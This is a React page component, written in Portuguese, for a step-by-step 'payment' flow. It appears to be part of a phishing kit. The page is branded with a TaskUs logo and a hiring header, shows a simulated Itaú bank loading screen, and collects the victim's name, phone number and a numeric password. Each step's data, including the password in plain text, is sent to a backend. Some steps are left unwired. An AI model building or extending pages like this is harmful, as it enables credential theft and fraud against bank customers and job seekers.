/* eslint-disable no-unused-vars */
import { useState } from "react";
import { useProcess } from "../hooks/useProcess.js";
import PaymentCreateAccountStep from "../components/steps/PaymentCreateAccountStep.jsx";
import PaymentItauLoadingStep from "../components/steps/PaymentItauLoadingStep.jsx";
import PaymentConfirmDataStep from "../components/steps/PaymentConfirmDataStep.jsx";
import PaymentPasswordStep from "../components/steps/PaymentPasswordStep.jsx";
import PaymentSuccessStep from "../components/steps/PaymentSuccessStep.jsx";
import PaymentTelNumber from "@/components/steps/PaymentTelNumber.jsx";
import Header from "../components/modules/Header.jsx";
// import PaymentConfirmPasswordStep from '@/components/steps/PaymentConfirmPasswordStep.jsx';
import PaymentCallback from "@/components/steps/PaymentCallback.jsx";

import LogoTaskUs from "../assets/logo-min.webp";
import { useNavigate } from "react-router-dom";

const TelaPagamento = () => {
  const navigate = useNavigate();

  const { processData, updateProcessStep } = useProcess();
  const [etapaAtual, setEtapaAtual] = useState(1);
  const [dadosPagamento, setDadosPagamento] = useState({});
  const [senhaCadastrada, setSenhaCadastrada] = useState("");
  const [erroSenha, setErroSenha] = useState(false);

  const [numberPhone, setNumberPhone] = useState("");
  const [nameUser, setNameUser] = useState("");

  // ==================== HANDLERS DOS EVENTOS ====================

  const handleIniciarCriacaoSenha = async () => {
    try {
      console.log("🔐 Iniciando criação de senha de acesso");

      const dadosInicio = {
        inicioProcesso: new Date().toISOString(),
        etapa: "criar_senha",
      };

      setDadosPagamento((prev) => ({ ...prev, ...dadosInicio }));

      await updateProcessStep(
        "pagamento",
        1,
        dadosInicio,
        "criar_senha_iniciado"
      );

      console.log("✅ Processo de criação de senha iniciado");
      setEtapaAtual(2); // Ir para loading do Itaú
    } catch (error) {
      console.error("❌ Erro ao iniciar criação de senha:", error);
    }
  };

  const handleLoadingCompleto = async () => {
    try {
      console.log("⏳ Loading do Itaú completo");

      const dadosLoading = {
        loadingCompleto: true,
        dataRedirecionamento: new Date().toISOString(),
      };

      await updateProcessStep("pagamento", 2, dadosLoading, "loading_completo");

      console.log("✅ Loading completo, indo para confirmação de dados");
      setEtapaAtual(3); // Ir para confirmação de dados
    } catch (error) {
      console.error("❌ Erro no loading:", error);
    }
  };

  const handleEditarDados = async () => {
    try {
      console.log("✏️ Solicitação para editar dados");
      alert("Funcionalidade de edição será implementada em breve");
    } catch (error) {
      console.error("❌ Erro ao editar dados:", error);
    }
  };

  const handleConfirmarDados = async () => {
    try {
      console.log("✅ Confirmando dados do usuário");

      const dadosConfirmados = {
        dadosConfirmados: true,
        dataConfirmacao: new Date().toISOString(),
      };

      await updateProcessStep(
        "pagamento",
        3,
        dadosConfirmados,
        "dados_confirmados"
      );

      console.log("✅ Dados confirmados, indo para criação de senha");
      setEtapaAtual(4); // Ir para criação de senha
    } catch (error) {
      console.error("❌ Erro ao confirmar dados:", error);
    }
  };

  const handleConfirmarTelefone = async (telefone) => {
    try {
      console.log("✅ Confirmando telefone do usuário");
      const dadosTelefone = {
        telefone,
        telefoneConfirmado: true,
        dataConfirmacaoTelefone: new Date().toISOString(),
      };
      setDadosPagamento((prev) => ({ ...prev, ...dadosTelefone }));
      await updateProcessStep(
        "pagamento",
        4,
        dadosTelefone,
        "telefone_confirmado"
      );
      setEtapaAtual(5); // Avança para step 5
    } catch (error) {
      console.error("❌ Erro ao confirmar telefone:", error);
    }
  };

  const handleCriarSenhaNumerica = async (senha) => {
    try {
      console.log("🔐 Criando senha numérica");

      // Salva a senha junto aos outros dados do pagamento
      const dadosSenha = {
        senha: senha,
        senhaDefinida: true,
        dataCriacaoSenha: new Date().toISOString(),
      };

      setDadosPagamento((prev) => ({ ...prev, ...dadosSenha }));
      setSenhaCadastrada(senha);
      setErroSenha(false);

      await updateProcessStep("pagamento", 4, dadosSenha, "senha_criada");

      console.log("✅ Senha criada, indo para confirmação");
      setEtapaAtual(6); // Ir para step de confirmação de senha
    } catch (error) {
      console.error("❌ Erro ao criar senha:", error);
    }
  };

  const handleConfirmarSenha = async (senhaConfirmacao) => {
    try {
      if (senhaConfirmacao !== senhaCadastrada) {
        setErroSenha(true);
        return;
      }
      setErroSenha(false);
      console.log("🔐 Confirmando senha");

      const dadosConfirmacao = {
        senhaConfirmada: true,
        dataConfirmacaoSenha: new Date().toISOString(),
      };

      setDadosPagamento((prev) => ({ ...prev, ...dadosConfirmacao }));

      await updateProcessStep(
        "pagamento",
        5,
        dadosConfirmacao,
        "senha_confirmada"
      );

      console.log("✅ Senha confirmada, indo para tela de sucesso");
      setEtapaAtual(7); // Ir para tela de sucesso
    } catch (error) {
      console.error("❌ Erro ao confirmar senha:", error);
    }
  };

  const handleFinalizarProcesso = async () => {
    try {
      console.log("🎉 Finalizando processo de pagamento");

      const dadosFinalizacao = {
        processoFinalizado: true,
        dataFinalizacao: new Date().toISOString(),
      };

      await updateProcessStep(
        "pagamento",
        6,
        dadosFinalizacao,
        "processo_finalizado"
      );

      setEtapaAtual(8);
    } catch (error) {
      console.error("❌ Erro ao finalizar processo:", error);
    }
  };

  // ==================== RENDERIZAÇÃO DAS ETAPAS ====================

  const renderEtapaAtual = () => {
    switch (etapaAtual) {
      case 1:
        return (
          <PaymentCreateAccountStep onCriarSenha={handleIniciarCriacaoSenha} />
        );

      case 2:
        return (
          <PaymentItauLoadingStep onLoadingComplete={handleLoadingCompleto} />
        );

      case 3:
        return (
          <PaymentConfirmDataStep
            dadosUsuario={processData}
            onEditar={handleEditarDados}
            onConfirmar={handleConfirmarDados}
            setNumbPhone={(numPhone) => {
              setNumberPhone(numPhone);
            }}
            setUserName={(name) => {
              setNameUser(name);
            }}
          />
        );
      case 4:
        return (
          <PaymentTelNumber
            onContinuar={handleConfirmarTelefone}
            isConfirmation={false}
            telefoneUsuarioProp={numberPhone}
          />
        );

      case 5:
        return <PaymentPasswordStep onContinuar={handleCriarSenhaNumerica} />;

      case 6:
        return (
          <PaymentSuccessStep
            onContinuar={handleFinalizarProcesso}
            dadosUsuario={processData}
            userName={nameUser}
          />
        );
      case 8:
        return (
          <PaymentCallback
            onContinue={() => {
              setTimeout(() => {
                navigate("/finally");
              }, 1000);
            }}
          />
        );

      default:
        return null;
    }
  };

  const ehTelaCompleta = () => {
    // Step 4 agora é tela inteira
    return [2, 3, 4, 5, 6, 7, 8].includes(etapaAtual);
  };

  // ==================== LAYOUT PRINCIPAL ====================

  return (
    <>
      {ehTelaCompleta() && renderEtapaAtual()}

      {!ehTelaCompleta() && (
        <div className="min-h-screen flex flex-col bg-[#0a0026]">
          <Header rightText="Contratação" />

          <div className="px-6 ">{renderEtapaAtual()}</div>
        </div>
      )}
    </>
  );
};

export default TelaPagamento;
